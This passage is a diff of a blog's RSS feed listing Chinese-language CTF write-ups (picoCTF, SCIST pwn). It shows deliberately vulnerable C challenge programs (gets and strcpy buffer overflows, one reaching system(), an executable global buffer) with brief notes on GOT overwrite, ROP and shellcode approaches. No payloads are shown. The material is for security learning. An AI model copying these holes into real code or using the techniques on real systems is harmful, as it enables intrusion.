+<a class="header-anchor" href="#%e5%b0%87%e9%a1%8c%e7%9b%ae%e7%9a%84pcap%e6%aa%94%e7%9a%84data%e6%8f%90%e5%8f%96%e5%87%ba%e4%be%86"></a>
+將題目的pcap檔的data提取出來
+</h2><h3 id="使用wireshark">
+<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8wireshark"></a>
+使用wireshark
+</h3><p><img src="/images/Silent_Stream/1.webp" alt="image"></p>
+<h3 id="提取資料">
+<a class="header-anchor" href="#%e6%8f%90%e5%8f%96%e8%b3%87%e6%96%99"></a>
+提取資料
+</h3><p>發現他都是10.10.10.10-&gt;10.10.10.11的tcp封包,且好像是同一個session,<br>
+因此我們隨便點一個封包,右鍵-&gt;Follow-&gt;TCP Stream
+<img src="/images/Silent_Stream/2.webp" alt="image">
+Show as 選擇Raw,按save as
+<img src="/images/Silent_Stream/3.webp" alt="image">
+儲存成stream.bin
+<img src="/images/Silent_Stream/4.webp" alt="image"></p>
+        
+        <hr><p>本文2026-08-18首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-18</p>]]>
+      </description>
+      
+        <category>picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>Input Injection 1</title>
+      <link>http://localhost:1313/post/input_injection_1/</link>
+      <pubDate>Tue, 18 Aug 2026 08:51:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/input_injection_1/</guid>
+      <description>
+        <![CDATA[<h1>Input Injection 1</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
           <h2 id="原始碼">
 <a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
 原始碼
-</h2><blockquote>
-<p>本題無提供原始碼</p>
-</blockquote>
-<h2 id="解題">
-<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
-解題
-</h2><h3 id="解題思路">
-<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
-解題思路
-</h3><p>利用更改got表的方式,跳到admin_shell()的function</p>
-<h3 id="確認保護機制">
-<a class="header-anchor" href="#%e7%a2%ba%e8%aa%8d%e4%bf%9d%e8%ad%b7%e6%a9%9f%e5%88%b6"></a>
-確認保護機制
-</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">checksec --file<span class="o">=</span>share/got 
-</span></span></code></pre></div><p><img src="/images/got/1.webp" alt="image"></p>
-<h3 id="嘗試執行">
-<a class="header-anchor" href="#%e5%98%97%e8%a9%a6%e5%9f%b7%e8%a1%8c"></a>
-嘗試執行
-</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-TEXT" data-lang="TEXT"><span class="line"><span class="cl">User ID: 1
-</span></span><span class="line"><span class="cl">Nickname: 1
-</span></span><span class="line"><span class="cl">PIN: 1
-</span></span><span class="line"><span class="cl">Logging as [1] ... Failed
-</span></span><span class="line"><span class="cl">Incorrect PIN code!
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">User ID: ^C
-</span></span></code></pre></div><p><img src="/images/got/2.webp" alt="image"></p>
-        
-        <hr><p>本文2026-06-06首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-06-06</p>]]>
-      </description>
-      
-        <category>SCIST pwn</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>ret2plt writeup</title>
-      <link>http://localhost:1313/post/ret2plt/</link>
-      <pubDate>Fri, 22 May 2026 13:21:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/ret2plt/</guid>
-      <description>
-        <![CDATA[<h1>ret2plt writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="題目原始碼">
-<a class="header-anchor" href="#%e9%a1%8c%e7%9b%ae%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
-題目原始碼
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt; </span><span class="cp">
 </span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">init</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span> <span class="s">&#34;echo &#39;Say hello to stack :D&#39;&#34;</span> <span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span> <span class="n">buf</span> <span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h2 id="what-is-gotglobal-offset-table">
-<a class="header-anchor" href="#what-is-gotglobal-offset-table"></a>
-What is GOT(Global Offset Table)?
-</h2><p>GOT 是 Linux ELF 執行檔中一個重要的資料結構,主要用來實現動態連結（Dynamic Linking）
-當程式呼叫外部函式庫的函式時(例如 printf、malloc),這些函式位於共享函式庫(如 libc.so)中。問題是:</p>
-        
-        <hr><p>本文2026-05-22首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-22</p>]]>
-      </description>
-      
-        <category>SCIST pwn</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>rop writeup</title>
-      <link>http://localhost:1313/post/rop/</link>
-      <pubDate>Fri, 22 May 2026 12:24:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/rop/</guid>
-      <description>
-        <![CDATA[<h1>rop writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="題目原始碼">
-<a class="header-anchor" href="#%e9%a1%8c%e7%9b%ae%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
-題目原始碼
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">init</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span> <span class="s">&#34;Say hello to stack :D&#34;</span> <span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span> <span class="n">buf</span> <span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h2 id="what-is-rop">
-<a class="header-anchor" href="#what-is-rop"></a>
-What is ROP?
-</h2><p>ROP 是一種利用程式漏洞執行惡意程式碼的攻擊手法。它主要用來繞過現代作業系統的防禦機制，特別是 DEP（Data Execution Prevention，資料執行保護）。
-<img src="/images/rop/1.webp" alt="image"></p>
-        
-        <hr><p>本文2026-05-22首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-22</p>]]>
-      </description>
-      
-        <category>SCIST pwn</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>orw writeup</title>
-      <link>http://localhost:1313/post/orw/</link>
-      <pubDate>Thu, 21 May 2026 21:34:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/orw/</guid>
-      <description>
-        <![CDATA[<h1>orw writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="題目原始碼">
-<a class="header-anchor" href="#%e9%a1%8c%e7%9b%ae%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
-題目原始碼
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// gcc -fno-stack-protector -no-pie chal.c -o chal
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;seccomp-bpf.h&#34;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="cp">#define username_len 0x400
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="n">username_len</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">apply_seccomp</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">sock_filter</span> <span class="n">filter</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="n">VALIDATE_ARCHITECTURE</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">      <span class="n">EXAMINE_SYSCALL</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">read</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">write</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">open</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">close</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">openat</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">exit</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">exit_group</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">getdents</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">getrandom</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">brk</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">readlink</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">rt_sigreturn</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="n">KILL_PROCESS</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="p">};</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">sock_fprog</span> <span class="n">prog</span> <span class="o">=</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="p">)(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">filter</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock_filter</span><span class="p">)),</span>
-</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="n">filter</span> <span class="o">=</span> <span class="n">filter</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="p">};</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_NO_NEW_PRIVS</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;Seccomp Error&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">};</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_SECCOMP</span><span class="p">,</span> <span class="n">SECCOMP_MODE_FILTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prog</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;Seccomp Error&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">};</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fun</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">username</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">mprotect</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_EXEC</span> <span class="o">|</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="cm">/* apply_seccomp(); */</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Username: &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">username_len</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Password: &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Wrong username/password! Please try again.&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;What is your name?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">name</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="p">[</span><span class="nf">strcspn</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fun</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">&#34;uname&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fun</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">c</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Goodbye, %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h2 id="解題">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
@@ -729,58 +543,61 @@ What is ROP?
 </h2><h3 id="解題思路">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
 解題思路
-</h3><p>題目只允許用部分syscall,我們用open,read,write,在username構建我們的payload,在password用overflow跳到username,將flag寫在終端機</p>
+</h3><p>name的大小最多可寫200,而buffer的大小最多可寫10,且strcpy為檢查字串大小直接複製,導致overflow,我們利用此覆蓋system要執行的指令</p>
         
-        <hr><p>本文2026-05-21首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-21</p>]]>
+        <hr><p>本文2026-08-18首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-18</p>]]>
       </description>
       
-        <category>SCIST pwn</category>
+        <category>Picoctf</category>
       
     </item>
     
     
 
     <item>
-      <title>ret2sc writeup</title>
-      <link>http://localhost:1313/post/ret2sc/</link>
-      <pubDate>Thu, 21 May 2026 20:46:52 &#43;0800</pubDate>
+      <title>Echo Escape 2</title>
+      <link>http://localhost:1313/post/echo_escape_2/</link>
+      <pubDate>Thu, 13 Aug 2026 16:08:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/ret2sc/</guid>
+      <guid>http://localhost:1313/post/echo_escape_2/</guid>
       <description>
-        <![CDATA[<h1>ret2sc writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>Echo Escape 2</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
-          <h2 id="題目原始碼">
-<a class="header-anchor" href="#%e9%a1%8c%e7%9b%ae%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
-題目原始碼
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+          <h2 id="原始碼">
+<a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
+原始碼
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[!] Could not open flag.txt&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Flag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter the secret key: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You entered:, %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
